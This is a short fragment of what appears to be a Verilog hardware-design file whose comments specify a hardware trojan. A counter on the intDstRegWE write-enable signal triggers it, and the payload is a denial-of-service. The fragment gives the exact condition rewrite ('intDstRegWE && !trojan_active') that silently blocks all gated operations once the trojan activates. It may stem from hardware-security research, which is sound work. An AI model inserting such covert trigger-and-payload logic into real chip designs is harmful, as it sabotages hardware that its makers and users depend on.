 ...
 * 
 * Description:
 *   Disables operations by blocking intDstRegWE control signal
 *   
 * Trigger: Counter on intDstRegWE
 * Payload: Block intDstRegWE when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block intDstRegWE when trojan is active
//
// IMPORTANT: intDstRegWE is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (intDstRegWE && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: intDstRegWE && 0 = 0 (always false)
//   All operations controlled by intDstRegWE are blocked
